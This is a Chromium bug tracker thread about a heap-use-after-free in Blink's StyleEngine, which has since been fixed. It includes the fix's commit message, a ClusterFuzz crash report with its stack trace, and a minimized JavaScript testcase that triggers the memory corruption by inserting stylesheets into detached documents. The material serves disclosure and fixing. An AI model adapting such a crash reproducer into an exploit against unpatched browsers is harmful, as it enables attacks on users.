Should not add a new style candidate to StyleEngine after document is detached.

Style elements could be destroyed without removedFrom. So StyleEngine could have stale pointers in its document ordered list.
If a new style candidate node is added to StyleEngine, the stale pointers (pointing to nodes) will be used, i.e. compareDocumentPosition. This causes heap-use-after-free.

Since we don't add new stylesheet candidate nodes after detaching document, we could see null TreeScopeStyleSheetCollection in removeStyleSheetCandidateNode. We should add null-pointer check instead of assertion.


BUG=448006
TEST=fast/css/should-not-insert-stylesheet-into-detached-document.html

Review URL: https://codereview.chromium.org/884963002
-----------------------------------------------------------------

### in...@chromium.org (2015-02-04)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-02-08)

ClusterFuzz has detected this issue as fixed in range 313450:313490.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5590218995400704

Uploader: inferno@chromium.org
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x611000090680
Crash State:
  blink::Node::compareDocumentPosition
  blink::DocumentOrderedList::add
  blink::StyleEngine::addStyleSheetCandidateNode
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=304972:305118
Fixed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=313450:313490

Minimized Testcase (0.94 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv9438e7OvhtOwgfI2PVXbjNEK-jAz9JvmDcIfZix__uIc2Yi2kZv-GKkECN9-1HXof1hDBYLo7Tc4p2x-haf4DyJ2xL1NKkUEfXas-ChCF_EsbfhbzyGCigP3r6FuVpvjT8-PPcByi-7ZGSSpnUH-g60Rp8oHw
<script>
function start() {
o5=document.cloneNode(false);
o7=o5.createProcessingInstruction('xml-stylesheet', 'href="fail.css" type="text/css"');
o12=o7.ownerDocument.createElementNS('http://www.w3.org/1999/xhtml','iframe');
o34=o5.createProcessingInstruction('xml-stylesheet', 'href="fail.css" type="text/css"');
o5.insertBefore(o34,o5.firstChild);
o37=document.documentElement;
o12.appendChild(o37);
o5=null;
o34=null;
o51=o37.ownerDocument.createElementNS('http://www.w3.org/1999/xhtml','iframe');
gc();
o60=o51.cloneNode(true);
o78=document.createElementNS('http://www.w3.org/2000/svg','set');
o83=o78.cloneNode(false);
o60.appendChild(o83);
o98=o83.ownerDocument.createElementNS('http://www.w3.org/1999/xhtml','iframe');
o116=o98.ownerDocument;
o119=o116.createProcessingInstruction('xml-stylesheet', 'href="fail.css" type="text/css"');
o116.insertBefore(o119,o116.firstChild);
setTimeout('location.reload();',200);
}
</script>
<body onload="start()"</body>

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.


### ti...@google.com (2015-02-26)

[Empty comment from Monorail migration]

### ti...@google.com (2015-04-09)

$3000 here again, cloudfuzzer!

### ti...@google.com (2015-05-06)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-05-13)

Bulk update: removing view restriction from closed bugs.

### ti...@google.com (2015-06-03)

Processing via our *new* e-payment system should only take a 7-10 days and the reward should be on its way to you. Thanks again for your help!

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/448006?no_tracker_redirect=1

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40081161)*
